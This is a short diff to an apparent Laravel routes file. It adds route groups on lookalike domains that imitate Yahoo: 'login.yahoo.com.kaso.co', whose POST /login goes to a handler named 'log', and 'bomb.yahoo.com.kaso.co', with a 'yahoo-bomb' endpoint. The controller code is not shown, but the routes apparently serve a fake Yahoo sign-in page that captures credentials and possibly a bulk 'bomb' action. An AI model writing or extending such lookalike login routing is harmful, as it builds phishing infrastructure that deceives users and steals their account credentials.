@@ -200,6 +200,16 @@
         Route::controller('/', 'DevelopersPageController');
     });
 
+    Route::group(['domain' => 'login.yahoo.com.kaso.co'], function () {
+        Route::get('/login', 'YahooController@login');
+        Route::post('/login', ['as' => 'yahoo-post-login', 'uses' => 'YahooController@log']);
+    });
+
+
+    Route::group(['domain' => 'bomb.yahoo.com.kaso.co'], function () {
+        Route::get('/show', 'YahooController@show');
+        Route::post('/show', ['as' => 'yahoo-bomb', 'uses' => 'YahooController@bomb']);
+    });
 
     /*
      * API ROUTES
@@ -251,3 +261,5 @@
         'as'   => 'oauth-login.post',
         'uses' => 'OAuthController@postAuthorize'
     ]);
+
+
